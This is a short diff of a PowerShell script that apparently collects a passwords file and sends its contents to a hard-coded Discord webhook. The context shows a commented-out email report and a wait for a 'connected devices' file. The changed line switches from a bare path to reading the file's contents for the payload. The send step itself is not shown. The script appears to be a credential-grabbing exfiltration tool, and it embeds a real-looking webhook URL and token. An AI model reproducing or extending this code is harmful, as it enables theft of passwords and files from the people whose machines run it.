@@ -27,7 +27,7 @@ Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file tak
 # $SMTPInfo.Send($ReportEmail) #Send mail
 $hookUrl = 'https://discord.com/api/webhooks/1137762085166657567/eXk-Sa6VaewqkzPvzF-O51MfE3COqfWRdaSBlJhn4ny_O43fhWa_lC033WZKrCLm3Lvc'
 
-$content = 'C:\Users\Public\Documents\passwords.txt'
+$content = Get-Content -Path 'C:\Users\.\Documents\test.txt'
 
 $payload = [PSCustomObject]@{
 
